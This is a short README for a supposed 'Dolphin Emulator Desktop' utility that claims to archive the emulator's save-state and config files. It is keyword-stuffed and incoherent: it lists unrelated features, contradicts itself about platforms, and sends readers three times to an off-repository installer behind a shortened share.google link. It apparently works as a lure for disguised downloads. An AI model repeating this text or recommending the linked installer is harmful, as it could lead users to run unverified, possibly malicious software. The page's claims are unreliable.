![Dolphin Emulator Desktop](assets/hero.png)

# Dolphin Emulator Desktop

*Keep the Dolphin Emulator save-state folder tidy before an update.*

## About

This repository is **Dolphin Emulator Desktop**, a Windows utility. Keep the Dolphin Emulator save-state folder tidy before an update.

Dolphin Emulator drops save-state files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Finds the Dolphin Emulator save-state directory.
- Copies config and BIOS-path files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Dolphin Emulator desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/jeremy-barnes270/dolphin-emulator-desktop

MIT license. See `LICENSE`.
